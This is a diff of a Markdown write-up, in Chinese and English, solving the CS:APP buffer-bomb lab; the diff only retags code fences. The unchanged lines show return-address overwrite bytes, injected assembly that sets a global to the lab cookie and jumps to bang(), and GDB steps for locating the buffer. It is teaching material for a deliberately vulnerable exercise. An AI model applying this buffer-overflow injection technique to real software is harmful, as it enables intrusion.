@@ -8,7 +8,7 @@
 首先通过 `objdump -d bufbomb > buf_asm` 导出bufbomb反汇编文件。
 
 网络流传的一套反汇编结果
-```c
+```asm
 08048c04 <getbuf>:
  8048c04:	55                   	push   %ebp
  8048c05:	89 e5                	mov    %esp,%ebp
@@ -40,7 +40,7 @@ We get the same result 48.
 Finally, according to your own situation，turn the adress to the address of _somke()_ function： `08048ccc <smoke>:`
 
 十六进制结果为：
-```shell
+```
 00 00 00 00    
 00 00 00 00    
 00 00 00 00    
@@ -66,14 +66,14 @@ cc 8c 04 08
 在这个level，我们的任务是调用 *fizz()* 函数。但是fizz需要一个参数，当这个参数等于你的cookie时，才能通过升级。
 
 Let's use the following command to get our cookie.
-```shell
+```bash
 $ ./makecookie hanggi
 ```
 I got the value of *0x11c1be21*.
 
 
 这个是网上流行的一个版本：
-```
+```asm
 0804906f <fizz>:
  804906f:	55                   	push   %ebp
  8049070:	89 e5                	mov    %esp,%ebp
@@ -84,7 +84,7 @@ I got the value of *0x11c1be21*.
 （这里可以参考网上的内容）
 
 这是我们的版本：
-```
+```asm
 08048cf3 <fizz>:
  8048cf3:	83 ec 1c             	sub    $0x1c,%esp
  8048cf6:	8b 44 24 20          	mov    0x20(%esp),%eax
@@ -125,14 +125,14 @@ f3 8c 04 08
 我们需要将global_value改成我们的cookie。    
 通过 `objdump -D bufbomb | less`获得global_value地址，
 
-```
+```asm
 0804d104 <global_value>:
  804d104:       00 00
 ```
 目前 *global_value* 的值为0，也可以看到cookie变量的地址，程序运行后会变为我们的cookie值。
 
 *bang()* 函数如下(网络版省略)：
-```
+```asm
 08048d4c <bang>:
  8048d4c:	83 ec 1c             	sub    $0x1c,%esp
  8048d4f:	a1 04 d1 04 08       	mov    0x804d104,%eax
@@ -140,7 +140,7 @@ f3 8c 04 08
 ```
 
 攻击指令如下：
-```
+```asm
 movl $0x11c1be21, 0x0804d104
 pushl 0x08048d4c
 ret
@@ -151,7 +151,7 @@ ret
 
 用 `gcc -m32 -c level2_p.s` 将代码编译成机器码，    
 再用 `objdump -d level2_p.o` 读取。
-```
+```asm
 00000000 <.text>:
    0:	c7 05 04 d1 04 08 21 	movl   $0x11c1be21,0x804d104
    7:	be c1 11
@@ -161,7 +161,7 @@ ret
 把代码抄入文件，    
 
 最后还要使用GDB获取输入内容存放的地址作为 ret 指令的目标地址。
-```
+```asm
 $gdb bufbomb
 (gdb) b *0x8048ed9           (在地址0x8048c0d设置断点)
 (gdb) r xx -u hanggi         (随便输入点字符让程序运行到断点位置)
